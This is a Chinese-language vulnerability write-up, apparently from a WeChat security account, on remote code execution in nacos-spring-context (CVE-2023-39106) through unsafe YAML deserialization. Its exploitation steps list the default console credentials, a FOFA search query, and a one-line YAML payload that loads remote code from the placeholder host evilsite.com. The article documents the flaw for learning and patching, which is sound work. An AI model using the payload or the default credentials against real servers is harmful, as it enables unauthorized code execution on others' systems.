> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2-k2anjXV-H7BNHKdAnTow)

_**简介**_

Nacos 是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。Nacos Spring 项目基于 Nacos，完全拥抱 Spring 生态，旨在帮助您快速构建 Spring 应用。该项目包含一个名为 的核心模块 nacos-spring-context。它使您能够通过以下方式扩展现代 Java 编程模型：注释驱动，依赖注入，外部化配置，事件驱动，这些功能强烈依赖于 Spring Framework 3.2+ API，并且可以与任何 Spring Stack 无缝集成，例如 Spring Boot 和 Spring Cloud。

```
GitHub：https://github.com/nacos-group/nacos-spring-project

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfgSEMCClqjJaUQSbibO0LZ9aOic0uKyOlIv5af7BTaDbxde8fOhFWFuo9xYdOW6fLjEVFMekO0R2Vng/640?wx_fmt=png)

_**漏洞描述**_

反序列化攻击者提供的 yaml 内容可能会导致远程代码执行。因此，当 spring 框架项目使用 nacos-spring-context 作为依赖项时，只需在 nacos 服务器中添加恶意的配置即可轻松进行 RCE。

_**影响版本**_

nacos-spring-context ≤ V1.1.1

_**空间测绘**_

```
该漏洞属于Spring依赖nacos-spring-context的漏洞，故无测绘特征，只能在源码中体现
Nacos空间测绘：app="NACOS"

```

_**漏洞利用**_

1. 创建一个空的 spring-framework 工程，并添加 nacos-spring-context 的依赖。

2. 添加下面的代码，按照文档所说，设置 NacosPropertySource：  

```
+import com.alibaba.nacos.api.config.ConfigType;
+import com.alibaba.nacos.spring.context.annotation.config.NacosPropertySource;
 @SpringBootApplication
+@NacosPropertySource(dataId = "example.yaml", type=ConfigType.YAML, autoRefreshed=true)
 public class Application {
        public static void main(String[] args) {
              ......

```

3. 登录 nacos 配置服务器

```
默认地址：http://xxx.xxx.xxx:8848/nacos/#/login
默认账密：nacos/nacos

```

然后编辑 example.yaml，添加以下一行配置：

```
test: !!javax.script.ScriptEngineManager  [ !!java.net.URLClassLoader  [[ !!java.net.URL  [ "http://evilsite.com" ]]]]

```

_**参考链接**_  

```
https://nvd.nist.gov/vuln/detail/CVE-2023-39106
https://github.com/nacos-group/nacos-spring-project/issues/314

```

**仅供学习交流，勿用作违法犯罪**

![](https://mmbiz.qpic.cn/mmbiz_gif/DT3jlATYvfgSEMCClqjJaUQSbibO0LZ9aSwwhnlm1uk7Bdg4R3kV3ymdXqaCCUn70g8eEm9EJu09XZdRKxAI8yw/640?wx_fmt=gif)